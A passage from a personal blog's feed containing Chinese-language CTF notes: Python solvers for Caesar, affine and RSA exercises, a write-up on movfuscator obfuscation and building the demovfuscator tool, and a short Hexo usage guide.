class="string">&#x27;nby_wuymul_wcjbyl_cm_ihy_iz_nby_gimn_vumcw_wfummcwuf_wcjbylm&#x27;</span></span><br><span class="line"><span class="comment"># 从0-25遍历</span></span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= <span class="built_in">ord</span>(i) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">            index = <span class="built_in">ord</span>(i) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            new_char = <span class="built_in">chr</span>((index + offset) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(new_char, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(i, end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>官方wp有一个string的库，这里学习了一下</p><blockquote><p><strong>问：from string import ascii_lowercase  string库是什么库？</strong></p><p><strong>答：在Python中，<code>string</code> 是一个标准库，它包含了许多与字符串处理相关的常用常量和函数。通过导入 <code>string</code> 库，你可以使用其中定义的常量和函数，而不需要自己定义相同的内容。</strong></p><p><strong>在给定的代码中，使用 <code>from string import ascii_lowercase</code> 导入了 <code>string</code> 标准库中的 <code>ascii_lowercase</code> 常量。<code>ascii_lowercase</code> 是一个包含所有小写字母的字符串，它的值为 <code>&#39;abcdefghijklmnopqrstuvwxyz&#39;</code>。这样一来，代码就可以直接使用 <code>ascii_lowercase</code> 变量来表示小写字母表，而不需要手动定义这个字符串。</strong></p></blockquote><h2 id="爱妃（仿射密码）"><a href="#爱妃（仿射密码）" class="headerlink" title="爱妃（仿射密码）"></a>爱妃（仿射密码）</h2><p>放射密码（Affine Cipher）是一种古典密码学中的替换密码，它对字母表中的字符进行加密和解密。放射密码的数学原理涉及到仿射函数的应用。</p><p>放射函数的一般形式为：E(x) &#x3D; (ax + b) mod m</p><p>其中：</p><ul><li>E(x) 表示密文字符；</li><li>x 表示明文字符；</li><li>a 和 b 是整数，并且满足 a 和 m 互质（最大公约数为1）；</li><li>mod m 表示对 m 取模，即结果在 0 到 (m-1) 的范围内。</li></ul><p>在放射密码中，每个明文字符 x 被映射为一个密文字符 E(x)。参数 a 和 b 是放射函数的密钥，通过正确选择这些密钥，可以实现有效的加密和解密。</p><p>解密过程是对密文字符应用逆放射函数：D(y) &#x3D; a^(-1) * (y - b) mod m，其中 a^(-1) 表示 a 的乘法逆元素。</p><a class="simple-lightbox" href="/2023/07/20/crypto/image-20230722180423532.png"><img   src="/images/loading.svg" data-src="/2023/07/20/crypto/image-20230722180423532.png"  class="" lazyload></a><a class="simple-lightbox" href="/2023/07/20/crypto/image-20230722181454094.png"><img   src="/images/loading.svg" data-src="/2023/07/20/crypto/image-20230722181454094.png"  class="" lazyload></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher, a_invert, b, m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([a_invert*(i   - b) % m <span class="keyword">for</span> i <span class="keyword">in</span> cipher])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">message, a, b, m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([(<span class="built_in">ord</span>(i) * a + b) % m <span class="keyword">for</span> i <span class="keyword">in</span> message])</span><br><span class="line"></span><br><span class="line">c = <span class="string">b&#x27;y\xba\xba\xea\xc7\x11\xc2\xc7\xcb\xd8ZV\xd8ZVp\xb1\xb1\xd8\x19\xa4V\xa4\x19\x8aM\xa83g\xd8&amp;\x19\xdc&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;NSSCTF&#123;&#x27;</span></span><br><span class="line"><span class="comment"># 计算密钥a，b</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">if</span> encrypt(flag, a, b, m) <span class="keyword">in</span> c:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"> <span class="comment"># print(a, b)</span></span><br><span class="line">m = <span class="number">1</span> &lt;&lt; <span class="number">8</span></span><br><span class="line">a = <span class="number">13</span> </span><br><span class="line">b = <span class="number">131</span></span><br><span class="line"><span class="comment"># 计算a的逆元函数</span></span><br><span class="line">a_invert = gmpy2.invert(<span class="number">13</span>,<span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a_invert = &#x27;</span>, a_invert)</span><br><span class="line">m = decrypt(c,a_invert,b,m)</span><br><span class="line"><span class="built_in">print</span>(m.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="littleprince-同余方程，中国剩余定理"><a href="#littleprince-同余方程，中国剩余定理" class="headerlink" title="littleprince(同余方程，中国剩余定理)"></a>littleprince(同余方程，中国剩余定理)</h2><p>这道题的给的加密代码有一些难理解，在这里记录一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">a, b, c</span>):</span><br><span class="line">  <span class="comment"># 1 &lt;&lt; b 表示将数字 1 左移 b 位，即得到一个只有第 b 位为1，其余位都为0的整数</span></span><br><span class="line">    <span class="comment"># 例如，如果 b 等于 3，那么 1 &lt;&lt; b 就等于二进制数 0b1000，也就是十进制数 8</span></span><br><span class="line"><span class="comment"># 对结果 1 &lt;&lt; b 减去 1，这样得到的二进制数将会是从第 0 位到第 b-1 位都是1，其余位都是0</span></span><br><span class="line"><span class="comment"># 以 b 等于 3 为例，((1 &lt;&lt; 3) - 1) 将得到二进制数 0b111，也就是十进制数 7</span></span><br><span class="line"><span class="comment"># 最后，我们将 a 和上述得到的结果进行按位与操作 &amp;，这样就会保留 a 的低 b 位，将其余高位都置为0</span></span><br><span class="line">    <span class="comment"># a的低b位的掩码在这里保留a的最后b位置，其他位置设为0</span></span><br><span class="line">    <span class="comment"># 它将这两个结果进行位或操作 | 并将低 c - b 位左移</span></span><br><span class="line">    <span class="comment"># 目的是对a进行加密并且返回</span></span><br><span class="line">    <span class="keyword">return</span> a &gt;&gt; b | (a &amp; ((<span class="number">1</span> &lt;&lt; b)-<span class="number">1</span>)) &lt;&lt; (c-b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">outp</span>(<span class="params">x, h</span>):</span><br><span class="line">    p = randint(<span class="number">1</span> &lt;&lt; h, <span class="number">1</span> &lt;&lt; h+<span class="number">1</span>)</span><br><span class="line">    q = randint(<span class="number">1</span> &lt;&lt; h, <span class="number">1</span> &lt;&lt; h+<span class="number">1</span>)</span><br><span class="line">    c1, c2 = x % p, x % q</span><br><span class="line">    <span class="built_in">print</span>(p, q, c1, c2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag 转成长整数m</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="comment"># 计算m的二进制位数</span></span><br><span class="line">m_len = m.bit_length()</span><br><span class="line">d, h, st = <span class="number">32</span>, <span class="number">16</span>, <span class="number">32</span></span><br><span class="line">r = m_len % d</span><br><span class="line"><span class="keyword">assert</span> (r &gt; h)</span><br><span class="line"><span class="keyword">while</span> st &lt;= m_len:</span><br><span class="line">    <span class="comment"># 对m进行加密</span></span><br><span class="line">    x = enc(m, st, m_len)</span><br><span class="line">    x &gt;&gt;= (m_len-d)</span><br><span class="line">    <span class="comment"># 输出加密结果</span></span><br><span class="line">    outp(x, h)</span><br><span class="line">    st += d</span><br><span class="line"><span class="comment"># 对 m 进行额外的加密操作，并通过 outp 函数输出最终的加密结果</span></span><br><span class="line">m &gt;&gt;= (m_len-r)</span><br><span class="line">outp(m, h)</span><br></pre></td></tr></table></figure><h3 id="掩码"><a href="#掩码" class="headerlink" title="掩码"></a>掩码</h3><blockquote><p>在计算机科学中，”掩码”（Mask）是一个用于屏蔽或提取某些位的二进制模式。掩码通常是一个与目标数据进行按位与操作的值，通过这种操作，可以将目标数据的某些位设置为0或从中提取出感兴趣的位。</p><p>掩码在计算机编程和计算机系统中有广泛的应用，主要用于以下两个方面：</p><ol><li>屏蔽位：掩码可以用于屏蔽目标数据的特定位。通过将目标数据与相应的掩码进行按位与操作，可以将不需要的位设置为0，而保留需要的位。这在编程中常用于清除或保留特定标志位，或者过滤掉数据中不需要的部分。</li><li>提取位：掩码还可以用于从目标数据中提取出感兴趣的位。通过将目标数据与相应的掩码进行按位与操作，可以将目标数据的其他位设置为0，而保留感兴趣的位。这在计算机系统中常用于从寄存器或数据中提取出特定字段或标志位。</li></ol><p>掩码通常使用二进制形式表示，并且每个位都对应于目标数据的相应位。在掩码中，1 表示需要保留或提取的位，0 表示需要屏蔽的位。</p><p>例如，对于目标数据 <code>11010110</code>，如果我们希望屏蔽掉低三位，我们可以使用掩码 <code>11111000</code>，通过进行按位与操作，结果将是 <code>11010000</code>。同样，如果我们希望提取低四位，我们可以使用掩码 <code>00001111</code>，通过进行按位与操作，结果将是 <code>00000110</code>。</p><ul><li>总结：与运算取出感兴趣的位，感兴趣为1，不感兴趣为0</li></ul></blockquote><h3 id="关于移位"><a href="#关于移位" class="headerlink" title="关于移位"></a>关于移位</h3><blockquote><p>a &gt;&gt; b | (a &amp; ((1 &lt;&lt; b)-1)) &lt;&lt; (c-b)</p><p>假设 <code>a</code> 等于 87 （二进制：<code>0b1010111</code>），<code>b</code> 等于 4。</p><ol><li><code>1 &lt;&lt; b</code> 的结果为 <code>0b10000</code>，也就是十进制数 16。</li><li><code>((1 &lt;&lt; b) - 1)</code> 的结果为 <code>0b1111</code>，也就是十进制数 15。</li><li><code>a &amp; ((1 &lt;&lt; b) - 1)</code> 就是 <code>0b1010111 &amp; 0b1111</code>，结果为 <code>0b111</code>，也就是十进制数 7。</li></ol><p>所以，<code>(a &amp; ((1 &lt;&lt; b) - 1))</code> 表达式的结果就是 <code>a</code> 的低 <code>b</code> 位的掩码，它将保留 <code>a</code> 二进制表示中的最后 <code>b</code> 位，并将其他位设置为0。</p></blockquote><h1 id="RSA系列"><a href="#RSA系列" class="headerlink" title="RSA系列"></a>RSA系列</h1><h2 id="RSA原理"><a href="#RSA原理" class="headerlink" title="RSA原理"></a>RSA原理</h2><p>生成数字</p><a class="simple-lightbox" href="/2023/07/20/crypto/image-20230724151309040.png"><img   src="/images/loading.svg" data-src="/2023/07/20/crypto/image-20230724151309040.png"  class="" lazyload></a><p>加密与解密</p><a class="simple-lightbox" href="/2023/07/20/crypto/image-20230724151346417.png"><img   src="/images/loading.svg" data-src="/2023/07/20/crypto/image-20230724151346417.png"  class="" lazyload></a><h2 id="RSA-Py代码实现"><a href="#RSA-Py代码实现" class="headerlink" title="RSA Py代码实现"></a>RSA Py代码实现</h2><p>Python代码的计算过程</p><ol><li><p>导入子库生成两个大素数，512bit朝</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># getPrime函数，它能够返回一个n位的素数</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br></pre></td></tr></table></figure></li><li><p>计算欧拉函数和n</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br></pre></td></tr></table></figure></li><li><p>选取e判断互素性，并且计算逆元</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e = 65537</span><br><span class="line">assert GCD(e, phi) == 1, &quot;该e不满足互素条件&quot;</span><br><span class="line">d = inverse(e, phi)</span><br></pre></td></tr></table></figure></li><li><p>加密hello</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里定义的是byte类型的字符串，每个字符用8位的二进制进行存储，如果直接定义字符串hello，字符串类型需要进行编码字节类型才可以进行加密</span></span><br><span class="line">message = <span class="string">b&#x27;hello&#x27;</span></span><br><span class="line"><span class="comment"># 使用的bytes_to_long函数，将字符串转换为数字</span></span><br><span class="line">m = bytes_to_long(message)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># 消息已经被转换为一个字符串了，可以加密</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">msg = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(msg)</span><br></pre></td></tr></table></figure></li><li><p>完整代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">assert</span> GCD(e, phi) == <span class="number">1</span>, <span class="string">&quot;该e不满足互素条件&quot;</span></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;公钥：(<span class="subst">&#123;e&#125;</span>, <span class="subst">&#123;n&#125;</span>)&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;私钥：(<span class="subst">&#123;d&#125;</span>, <span class="subst">&#123;n&#125;</span>)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">message = <span class="string">b&#x27;hello&#x27;</span></span><br><span class="line">m = bytes_to_long(message)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;消息：&#x27;</span>, m)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;密文：&#x27;</span>, c)</span><br><span class="line"></span><br><span class="line">msg = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;明文：&#x27;</span>, msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> msg == m, <span class="string">&quot;解密失败&quot;</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HNCTF&quot;&gt;&lt;a href=&quot;#HNCTF&quot; class=&quot;headerlink&quot; title=&quot;HNCTF&quot;&gt;&lt;/a&gt;HNCTF&lt;/h1&gt;&lt;h2 id=&quot;baBAbaseSEse（base家族）&quot;&gt;&lt;a href=&quot;#baBAbaseSEse（base家族）&quot;</summary>
      
    
    
    
    <category term="crypto" scheme="https://kidder1.github.io/categories/crypto/"/>
    
    
    <category term="crypto" scheme="https://kidder1.github.io/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>movfuscator混淆</title>
    <link href="https://kidder1.github.io/2023/07/19/movfuscator%E6%B7%B7%E6%B7%86/"/>
    <id>https://kidder1.github.io/2023/07/19/movfuscator%E6%B7%B7%E6%B7%86/</id>
    <published>2023-07-19T07:05:36.000Z</published>
    <updated>2023-07-20T03:45:54.207Z</updated>
    
    <content type="html"><![CDATA[<h1 id="混淆器"><a href="#混淆器" class="headerlink" title="混淆器"></a>混淆器</h1><p>在mov指令的图灵完备性被证明之后，就产生了一种使用mov指令代替其他各种指令的混淆机制，运算，跳转，函数调用都可以全部使用mov指令实现。</p><p>Githhub链接：<a href="https://github.com/xoreaxeaxeax/movfuscator">https://github.com/xoreaxeaxeax/movfuscator</a> 按照github安装之后，正常编译就行</p><h1 id="解混淆器"><a href="#解混淆器" class="headerlink" title="解混淆器"></a>解混淆器</h1><p>Github链接：<a href="https://github.com/kirschju/demovfuscator">https://github.com/kirschju/demovfuscator</a></p><p>这个需要三个库：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">- libcapstone</span><br><span class="line">sudo git clone https:<span class="comment">//github.com/aquynh/capstone.git</span></span><br><span class="line">cd capstone/</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">- libz3</span><br><span class="line">sudo git clone https:<span class="comment">//github.com/Z3Prover/z3.git</span></span><br><span class="line">cd z3</span><br><span class="line">python scripts/mk_make.py</span><br><span class="line">cd build</span><br><span class="line">make</span><br><span class="line">sudo make install </span><br><span class="line">- libkeystone</span><br><span class="line">sudo git clone https:<span class="comment">//github.com/keystone-engine/keystone.git</span></span><br><span class="line">cd keystone/</span><br><span class="line">sudo mkdir build</span><br><span class="line">cd build/</span><br><span class="line">sudo ../make-share.sh </span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig</span><br><span class="line">- demovfuscator </span><br><span class="line">git clone https:<span class="comment">//github.com/kirschju/demovfuscator.git</span></span><br><span class="line">make</span><br></pre></td></tr></table></figure><ul><li>思路mov混淆的解决方式：<ol><li>简单的，会在某个寄存器中出现，全局搜索该寄存器后可以得出结果</li><li>或者可以使用动态调试出结果</li><li>难的，需要爆破</li><li>使用工具 https:&#x2F;&#x2F;<a href="https://so.csdn.net/so/search?q=github&spm=1001.2101.3001.7020">github</a>.com&#x2F;kirschju&#x2F;demovfuscator</li><li>找到字符串然后根据读写断点观察输入在内存的变化找到&#x2F;猜测加密逻辑</li></ol></li></ul><h1 id="例子ciscn-2023-moveAside"><a href="#例子ciscn-2023-moveAside" class="headerlink" title="例子ciscn 2023 moveAside"></a>例子ciscn 2023 moveAside</h1><p>这道题mov混淆呢，当时没有做出来，现在看了一些师傅的题解，稍微复盘总结一</p><h2 id="查找字符串"><a href="#查找字符串" class="headerlink" title="查找字符串"></a>查找字符串</h2><p>找到字符串向上翻阅</p><a class="simple-lightbox" href="/2023/07/19/movfuscator%E6%B7%B7%E6%B7%86/image-20230719171047390.png"><img   src="/images/loading.svg" data-src="/2023/07/19/movfuscator%E6%B7%B7%E6%B7%86/image-20230719171047390.png"  class="" lazyload></a><p>可以找到密文，这里我已经转成数组形式了</p><a class="simple-lightbox" href="/2023/07/19/movfuscator%E6%B7%B7%E6%B7%86/image-20230719171223774.png"><img   src="/images/loading.svg" data-src="/2023/07/19/movfuscator%E6%B7%B7%E6%B7%86/image-20230719171223774.png"  class="" lazyload></a><p>这里可以得到字符串长度是44</p><a class="simple-lightbox" href="/2023/07/19/movfuscator%E6%B7%B7%E6%B7%86/image-20230719172931878.png"><img   src="/images/loading.svg" data-src="/2023/07/19/movfuscator%E6%B7%B7%E6%B7%86/image-20230719172931878.png"  class="" lazyload></a><p>然后这里直接下断点调试的话是会触发异常的，可以看到这里调用了sigaction函数</p><a class="simple-lightbox" href="/2023/07/19/movfuscator%E6%B7%B7%E6%B7%86/image-20230720092516751.png"><img   src="/images/loading.svg" data-src="/2023/07/19/movfuscator%E6%B7%B7%E6%B7%86/image-20230720092516751.png"  class="" lazyload></a><a class="simple-lightbox" href="/2023/07/19/movfuscator%E6%B7%B7%E6%B7%86/image-20230720092828038.png"><img   src="/images/loading.svg" data-src="/2023/07/19/movfuscator%E6%B7%B7%E6%B7%86/image-20230720092828038.png"  class="" lazyload></a><p>IDA这个异常处理的过程我一直不是很了解,根据搜索字符串然后下断点调试再试试</p><a class="simple-lightbox" href="/2023/07/19/movfuscator%E6%B7%B7%E6%B7%86/image-20230720102536313.png"><img   src="/images/loading.svg" data-src="/2023/07/19/movfuscator%E6%B7%B7%E6%B7%86/image-20230720102536313.png"  class="" lazyload></a><p>这里又触发异常了，这里设置成这样好像就不会有提示了</p><a class="simple-lightbox" href="/2023/07/19/movfuscator%E6%B7%B7%E6%B7%86/image-20230720102714851.png"><img   src="/images/loading.svg" data-src="/2023/07/19/movfuscator%E6%B7%B7%E6%B7%86/image-20230720102714851.png"  class="" lazyload></a><p>然后这个一直按着F9调试一直等到所有的停住即可</p><a class="simple-lightbox" href="/2023/07/19/movfuscator%E6%B7%B7%E6%B7%86/image-20230720110254452.png"><img   src="/images/loading.svg" data-src="/2023/07/19/movfuscator%E6%B7%B7%E6%B7%86/image-20230720110254452.png"  class="" lazyload></a><p>然后一直没有反应，在密文那块下了一个读写断点</p><a class="simple-lightbox" href="/2023/07/19/movfuscator%E6%B7%B7%E6%B7%86/image-20230720111141895.png"><img   src="/images/loading.svg" data-src="/2023/07/19/movfuscator%E6%B7%B7%E6%B7%86/image-20230720111141895.png"  class="" lazyload></a><p>密文长度</p><a class="simple-lightbox" href="/2023/07/19/movfuscator%E6%B7%B7%E6%B7%86/image-20230720111254827.png"><img   src="/images/loading.svg" data-src="/2023/07/19/movfuscator%E6%B7%B7%E6%B7%86/image-20230720111254827.png"  class="" lazyload></a><p>跳不出来，，，我晕了。。。。算了还是太菜了。。。</p><h2 id="用工具"><a href="#用工具" class="headerlink" title="用工具"></a>用工具</h2><p>这个破工具装了一下午，刚开始在ubuntu18上面，结果那个clang的版本不够，然后有在22上面装，结果编译那个库编译了几十分钟，然后我又make -j8，才搞好。</p><p>试试效果怎么样</p><a class="simple-lightbox" href="/2023/07/19/movfuscator%E6%B7%B7%E6%B7%86/image-20230719182131996.png"><img   src="/images/loading.svg" data-src="/2023/07/19/movfuscator%E6%B7%B7%E6%B7%86/image-20230719182131996.png"  class="" lazyload></a><p>好吧，结果惨不忍睹，不能运行，不能反编译，跟没用一样。。。大概也就这样，这玩意肯定工程上面用不上，只能对简单的程序进行一些操作，也只能在CTF这里玩完了，但不妨碍它是一个伟大的发明。</p><p>参考博客</p><p><a href="https://blog.csdn.net/CherestSan/article/details/117608664">(121条消息) movfuscator混淆_mov混淆_Cherest_San的博客-CSDN博客</a></p><p> <a href="https://blog.csdn.net/weixin_52118017/article/details/130997247">CISCN 2023 初赛]moveAside_FeiJiNcFan的博客-CSDN博客</a></p><p><a href="https://or4ngesec.github.io/post/ciscn-2023-writeup-by-or4nge/#moveaside">CISCN2023 初赛 Writeup by or4nge (or4ngesec.github.io)</a></p><p><a href="https://blog.csdn.net/qq_33438733/article/details/79860304">(121条消息) movfuscator混淆了解一下 CTF_mov混淆_坚强的女程序员的博客-CSDN博客</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;混淆器&quot;&gt;&lt;a href=&quot;#混淆器&quot; class=&quot;headerlink&quot; title=&quot;混淆器&quot;&gt;&lt;/a&gt;混淆器&lt;/h1&gt;&lt;p&gt;在mov指令的图灵完备性被证明之后，就产生了一种使用mov指令代替其他各种指令的混淆机制，运算，跳转，函数调用都可以全部使用mov指</summary>
      
    
    
    
    <category term="Reverse" scheme="https://kidder1.github.io/categories/Reverse/"/>
    
    
  </entry>
  
  <entry>
    <title>Hexo使用说明</title>
    <link href="https://kidder1.github.io/2023/07/18/hexo%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/"/>
    <id>https://kidder1.github.io/2023/07/18/hexo%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/</id>
    <published>2023-07-18T01:30:09.000Z</published>
    <updated>2023-07-18T04:37:30.668Z</updated>
    
    <content type="html"><![CDATA[<p>Hexo使用说明</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo n  # 创建文章</span><br><span class="line">hexo cl # 清理缓存</span><br><span class="line">hexo g  # 生成博客</span><br><span class="line">hexo s  # 本地部署</span><br><span class="line">hexo d  # 上线部署</span><br></pre></td></tr></table></figure><a class="simple-lightbox" href="/2023/07/18/hexo%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/image-20230718094005578.png"><img   src="/images/loading.svg" data-src="/2023/07/18/hexo%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/image-20230718094005578.png"  class="" title="This is an test image" lazyload></a><p>插入图片的话，安装插件，然后用下面的格式进行插入即可，图片描述可以自行修改</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% asset_img imageName imageDescription %&#125;</span><br></pre></td></tr></table></figure><p>博客的分类标签摘要等配置看下图即可</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">title: Hexo使用说明</span><br><span class="line">date: 2023-07-18 09:30:09</span><br><span class="line">author: Kidder1</span><br><span class="line">summary: Hexo使用简要说</span><br><span class="line">categories: Begin</span><br><span class="line">tag: </span><br><span class="line">- Begin </span><br><span class="line">- Hexo</span><br></pre></td></tr></table></figure><p>在根目录下面设置了两个sh文件，无论部署还是测试直接运行即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Hexo使用说明&lt;/p&gt;
&lt;figure class=&quot;highlight text&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;</summary>
      
    
    
    
    <category term="Begin" scheme="https://kidder1.github.io/categories/Begin/"/>
    
    
    <category term="Begin" scheme="https://kidder1.github.io/tags/Begin/"/>
    
    <category term="Hexo" scheme="https://kidder1.github.io/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>博客配置说明书</title>
